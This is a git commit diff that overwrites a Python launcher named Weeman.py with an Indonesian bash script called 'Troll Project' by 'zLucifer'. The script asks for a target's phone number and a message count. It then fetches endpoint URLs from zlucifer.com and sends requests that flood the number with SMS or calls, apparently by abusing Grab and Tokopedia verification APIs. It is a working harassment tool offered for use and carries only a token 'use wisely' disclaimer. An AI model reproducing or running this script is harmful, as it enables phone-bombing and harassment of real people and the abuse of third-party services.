3700369acc0f25680bef21bfebfd70e0c1947c2c
DHSICLUB <56116647+DHSICLUB@users.noreply.github.com>
2020-07-19 05:44:23 +0700

    Weeman.sh

--- Weeman.py
+++ Weeman.py
@@ -1,43 +1,207 @@
-import sys
-import optparse
-from core.misc import printt
-from core.config import user_agent as usera
-
-def tests_pyver():
-    if sys.version[:3] == "2.7" or "2" in sys.version[:3]:
-        pass # All good
-    elif "3" in sys.version[:3]:
-        printt(1,"Weeman has no support for Python 3.")
-    else:
-        printt(1, "Your Python version is very old ..")
-
-def tests_platform():
-    if "linux" in sys.platform:
-        #printt(3, "Running Weeman on linux ... (All good)")
-        pass
-    elif "darwin" in sys.platform:
-        #printt(3, "Running Weeman on \'Mac\' (All good)")
-        pass
-    elif "win" in sys.platform:
-        print("Sorry, there is no support for windows right now.")
-        sys.exit(1)
-    else:
-        printt(3, "If \'Weeman\' runs sucsessfuly on your platform %s\nPlease let me (@Hypsurus) know!" %sys.platform)
-
-def main():
-    tests_pyver()
-    tests_platform()
-    parser = optparse.OptionParser()
-    parser.add_option("-q", "--quiet", dest="quiet_mode_opt", action="store_true", default=False, help="Runs without displaying the banner.")
-    parser.add_option("-p", "--profile", dest="profile", help="Load weeman profile.")
-    options,r = parser.parse_args()
-
-    if options.profile:
-        from core.shell import shell_noint
-        shell_noint(options.profile)
-    else:
-        from core.shell import shell
-        shell()
-
-if __name__ == '__main__':
-    main()
+#!/bin/bash
+#///////////////////////////////////////////////////////////////////////////////
+#///////////////////////////////////////////////////////////////////////////////
+#////                       _            _  __                              ////
+#////                      | |          (_)/ _|                             ////
+#////                   ___| |_   _  ___ _| |_ ___ _ __                     ////
+#////                  |_  / | | | |/ __| |  _/ _ \ '__|                    ////
+#////                   / /| | |_| | (__| | ||  __/ |                       ////
+#////                  /___|_|\__,_|\___|_|_| \___|_|                       ////
+#////                                                                       ////
+#///////////////////////////////////////////////////////////////////////////////
+#///////////////////////////////////////////////////////////////////////////////
+#PERINGATAN : KESALAHAN ATAU KEJAHATAN ADALAH TANGGUNG JAWAB DARI PEMAKAI
+#GUNAKAN TOOLS UNTUK KEBAIKAN JANGAN DISALAH GUNAKAN :)
+troll(){
+    clear
+    sleep 0.03
+    echo "         _ "
+    sleep 0.03
+    echo "        /_)  _.-===-._ "
+    sleep 0.03
+    echo "       /  .; '_-.'- .'.     _ "
+    sleep 0.03
+    echo "  __ _/  /.'\ ._  '. , \   (_\ "
+    sleep 0.03
+    echo " /\_( \  |.'.-._'- .  '|     \ "
+    sleep 0.03
+    echo " |_)  /  |/'    ''--''\|     _\__ "
+    sleep 0.03
+    echo " \_)_|  /'  ._.   ._.  '\   / )(_\ "
+    sleep 0.03
+    echo " )/  (  \_      _      _/   \' (_| "
+    sleep 0.03
+    echo " /   /    \           /     _) (_/ "
+    sleep 0.03
+    echo " |   '',_ _'._'---'_.'_ _,.'    | \ "
+    sleep 0.03
+    echo " \    /  \ \  '''''  / / /     /   \ "
+    sleep 0.03
+    echo "  \_.'    \ \       / /  |   .' "
+    sleep 0.03
+    echo "   '--.,   \ \     / /  _;-'' "
+    sleep 0.03
+    echo "       '|   \ \   / /   | "
+    sleep 0.03
+    echo "       .;----'''''''----;. "
+    sleep 0.03
+    echo "      /(                 )\ "
+    sleep 0.03
+    echo "      \_''-------------''_/ "
+    sleep 0.03
+    echo "      | '';-----;-----;'' | "
+    sleep 0.03
+    echo "      | / : \ / : \ / : \ | "
+    sleep 0.03
+    echo "      |V.','.V.','.V.','.V| "
+    sleep 0.03
+    echo "      \'./_\.;./_\.;./_\.'/ "
+    sleep 0.03
+    echo "       ';..___________..;' "
+    sleep 0.03
+    echo " ============================="
+    sleep 2
+    echo " ==      Troll Project      =="
+    sleep 0.7
+    echo " ============================="
+}
+load(){
+    echo -e "\n"
+    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
+    barlength=${#bar}
+    i=0
+    while((i<100)); do
+        n=$((i*barlength / 100))
+        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
+        ((i += RANDOM%5+2))
+        sleep 0.2
+    done
+}
+get_sms=$(curl -s http://zlucifer.com/api/hackbae.php?request=sms)
+get_call=$(curl -s http://zlucifer.com/api/hackbae.php?request=call)
+mulai (){
+    echo "Gunakan Troll Project Lagi?"
+    echo "y/n?"
+    echo
+    read lagi
+    if [ $lagi = "y" ]; then
+            spam
+    else
+            echo "Terimakasih sudah menggunakan Troll project"
+    fi
+}
+#spam
+spam(){
+    clear
+    troll
+    echo
+    echo "[1] Spam SMS"
+    echo "[2] Spam Telp"
+    echo "[3] Close Troll Project"
+    echo
+    echo "1/2/3?"
+    read pilih
+    if [ $pilih = "1" ]; then
+            echo "Troll Spam SMS"
+            #function spam
+            echo
+            echo "Silahkan masukan nomor telp target"
+            echo contoh 0812345678
+            read target # masukin no telp
+            echo
+            echo "Berapa sms yang mau dikirim?"
+            read paket
+            echo
+            echo Apakah nomor $target "dan SMS dikirim "$paket" sudah benar?"
+            echo y/n?
+            read confirm
+            echo
+            if [ $confirm = "y" ]; then
+                    load
+                    clear
+                    echo Melakukan spam SMS ke nomor $target
+                    echo
+                    echo "Jangan close aplikasi sebelum spam selesai"
+                    echo "========================================"
+                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
+                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
+                    echo " Gunakan tools dengan bijak"
+                    echo
+                    echo " Love u always "
+                    echo " -zLucifer"
+                    echo "======================================="
+            else
+                    echo "Kesalahan"
+            fi
+        mulai
+    elif [ $pilih = "2" ]; then
+            echo "Troll Spam Call"
+            #function spam
+            echo
+            echo "Silahkan masukan nomor telp target"
+            echo contoh 0812345678
+            read target # masukin no telp
+            echo
+            echo "Gunakan API Grab/Toped?"
+            echo "[1] GRAB"
+            echo "[2] TOPED"
+            echo "1/2?"
+            read api
+            if [ $api = "1" ]; then
+                  api_spam="grab"
+            else
+                  api_spam="toped"
+            fi
+            echo Apakah nomor $target dan spam menggunakan $api_spam "sudah benar?"
+            echo y/n?
+            read confirm
+            echo
+            if [ $confirm = "y" ]; then
+                  load
+                  clear
+                  echo Melakukan spam call ke nomor $target
+                  echo
+                  echo "Jangan close aplikasi sebelum spam selesai"
+                  echo "========================================"
+                  cek_target=`curl -s $get_call/call.php?nomor=$target"&method="$api_spam`
+                  echo -e $cek_target
+                  echo " Gunakan tools dengan bijak"
+                  echo
+                  echo " Love u always "
+                  echo " -zLucifer"
+                  echo "========================================"
+            else
+                  echo Kesalahan, silahkan coba lagi
+            fi
+        mulai
+    elif [ $pilih = "3" ]; then
+        echo "Terimakasih sudah menggunakan Troll project"
+        close
+    else
+        clear
+        echo "Kesalahan"
+        mulai
+    fi
+}
+close(){
+    exit
+}
+clear
+echo "Loading.."
+load
+clear
+troll
+echo Selamat datang kak, Siapa nick kaka? #tulisan keluar
+read nick #membaca yang ditulis
+clear
+troll
+echo Selamat datang $nick ":)"
+echo
+echo "Mulai troll project?"
+echo "y/n?"
+read mulai
+if [ $mulai = "y" ]; then
+      spam
+else
+      close
+fi
